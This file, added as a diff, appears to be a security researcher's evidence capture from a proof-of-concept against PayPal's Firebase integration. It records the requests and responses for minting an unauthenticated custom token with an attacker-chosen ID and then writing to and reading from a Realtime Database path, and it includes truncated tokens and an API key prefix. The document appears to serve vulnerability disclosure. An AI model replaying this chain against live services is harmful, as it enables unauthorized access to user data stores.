@@ -1,0 +1,35 @@
+# evidence capture - firebase unauth mint -> message-bus R/W
+# date: 2026-07-19 16:20:40 UTC
+
+--- Mint Firebase custom token via GraphQL with with ---
+request: POST https://www.paypal.com/graphql?GetFireBaseSessionToken  (x-app-name: smart-payment-buttons)
+  sessionUID (attacker-controlled) = poc_a1b2c3d4e5_20260719
+response: sessionToken (RS256, signed by firebase-adminsdk-9vksp@api-project-[redacted].iam.gserviceaccount.com):
+  eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJodHRwczovL2l...
+  JWT payload: iss=firebase-adminsdk-9vksp@api-project-[redacted].iam.gserviceaccount.com
+                sub=firebase-adminsdk-9vksp@api-project-[redacted].iam.gserviceaccount.com
+                uid (note: NOT in claim, set server-side from sessionUID)
+
+--- Exchange custom token for idToken (Identity Toolkit, public key) ---
+request: POST https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=AIzaSyCjAXE6JoC5e...
+response: idToken=eyJhbGciOiJSUzI1NiIsImtpZCI6ImIyNDg2Mzc0OTVjYjM4N2...  refreshToken=AMf-vBwQmj1ggkvZ9N26...  isNewUser=True
+
+--- WRITE users/{$SESSIONUID}/messages (auth.uid == uid; uid attacker-controlled) ---
+request: PUT https://api-project-[redacted].firebaseio.com/users/poc_a1b2c3d4e5_20260719/messages/msg1.json?auth=<idToken>
+  body sent: {'injected': 'poc_message', 'from': 'attacker', 'session_uid': 'ATTACKER_CONTROLS_THIS'}
+  HTTP: 200  response: {"from":"attacker","injected":"poc_message","session_uid":"ATTACKER_CONTROLS_THIS"}
+
+--- READ it back (cross-uid read of an attacker-minted path) ---
+request: GET https://api-project-[redacted].firebaseio.com/users/poc_a1b2c3d4e5_20260719/messages.json?auth=<idToken>
+  HTTP: 200  response: {"msg1":{"from":"attacker","injected":"poc_message","session_uid":"ATTACKER_CONTROLS_THIS"}}
+
+--- CLEANUP: DELETE .../messages/msg1.json -> HTTP $DCODE ---
+
+--- CONTROL: top-level /users.json (rules hold for non-minted paths) ---
+request: GET https://api-project-[redacted].firebaseio.com/users.json?auth=<idToken>
+  HTTP: 401  response: {
+  "error" : "Permission denied"
+}
+
+
+ => mint+exchange+write+read+cleanup all succeed unauthenticated; top-level enumeration blocked (rules hold).
